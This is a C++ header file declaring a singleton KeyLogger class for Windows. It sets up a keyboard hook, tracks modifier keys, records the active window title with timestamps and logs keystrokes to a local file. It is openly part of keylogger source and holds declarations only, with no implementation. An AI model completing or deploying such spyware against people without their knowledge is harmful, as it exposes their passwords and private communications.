#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>

//Keyboard codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54
#define SC_SPACE 57
#define SC_ENTER 28


class KeyLogger {

    public:

    static KeyLogger* getInstance();
    static void releaseInstance();

    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    //starts logging keyboard input
    void listen();

    HHOOK getHook();

    bool isAltDown();
    void setAltDown(bool down);

    bool isCtrlDown();
    void setCtrlDown(bool down);

    bool isLShiftDown();
    void setLShiftDown(bool down);

    bool isRShiftDown();
    void setRShiftDown(bool down);

    std::string getActiveWindowTitle();

    protected:

    KeyLogger(std::string logFilePath = "out.txt");
    ~KeyLogger();

	void log(std::string text);

	std::string getTimeString();

    //singleton
    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK hook;

    std::ofstream logFile;
	std::string logFilePath;

	std::string keyboardBuffer;
	std::string activeWindowTitle;
};

#endif // H_KEYLOGGER
